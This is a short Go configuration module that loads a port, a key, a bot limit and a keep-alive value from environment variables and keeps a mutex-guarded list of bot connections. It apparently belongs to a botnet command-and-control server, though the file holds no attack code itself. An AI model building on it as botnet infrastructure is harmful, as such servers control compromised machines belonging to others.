package config

import (
	"log"
	"net"
	"os"
	"strconv"
	"sync"

	env "github.com/joho/godotenv"
)

var (
	PORT       string
	KEY        []byte
	BOT_LIMIT  int
	KEEP_ALIVE int
	BOT        []net.Conn
	Mutex      sync.Mutex
)

func init() {
	err := env.Load()
	if err != nil {
		log.Fatalf(" [!] Error: %s", err.Error())
	}
	PORT = os.Getenv("PORT")
	KEY = []byte(os.Getenv("KEY"))
	BOT_LIMIT = StringToInt(os.Getenv("BOT_LIMIT"))
	KEEP_ALIVE = StringToInt(os.Getenv("KEEP_ALIVE"))

}

func StringToInt(input string) int {
	Numero, err := strconv.Atoi(input)
	if err != nil {
		log.Fatalf(" [!] Error: %s", err.Error())
		return 0
	}
	return Numero

}
